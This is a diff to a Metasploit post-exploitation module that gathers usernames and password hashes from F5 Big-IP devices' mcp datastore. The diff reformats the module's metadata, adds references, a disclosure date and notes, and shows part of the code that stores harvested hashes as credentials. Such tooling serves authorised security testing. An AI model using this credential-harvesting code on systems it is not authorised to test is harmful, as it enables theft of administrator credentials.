@@ -9,22 +9,33 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Linux::F5
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'         => 'F5 Big-IP Gather Users',
-      'Description'  => %q{
-        This module gathers usernames and password hashes from F5's mcp
-        datastore, which is accessed via /var/run/mcp.
+    super(
+      update_info(
+        info,
+        'Name' => 'F5 Big-IP Gather Users',
+        'Description' => %q{
+          This module gathers usernames and password hashes from F5's mcp
+          datastore, which is accessed via /var/run/mcp.
 
-        Adapted from:  https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
-      },
-      'License'      => MSF_LICENSE,
-      'Author'       =>
-        [
-          'Ron Bowes'
+          Adapted from:  https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Ron Bowes'],
+        'Platform' => ['linux'],
+        'SessionTypes' => ['shell', 'meterpreter'],
+        'References' => [
+          [ 'URL', 'https://github.com/rbowes-r7/refreshing-mcp-tool' ], # Original PoC
         ],
-      'Platform'     => ['linux'],
-      'SessionTypes' => ['shell', 'meterpreter']
-    ))
+        'DisclosureDate' => '2022-11-16',
+        'Targets' => [[ 'Auto', {} ]],
+        'DefaultTarget' => 0,
+        'Notes' => {
+          'Stability' => [],
+          'Reliability' => [],
+          'SideEffects' => []
+        }
+      )
+    )
   end
 
   def run
@@ -42,7 +53,7 @@ class MetasploitModule < Msf::Post
       create_credential(
         jtr_format: Metasploit::Framework::Hashes.identify_hash(u['userdb_entry_passwd']),
         origin_type: :session,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         private_type: :nonreplayable_hash,
         private_data: u['userdb_entry_passwd'],
         session_id: session_db_id,
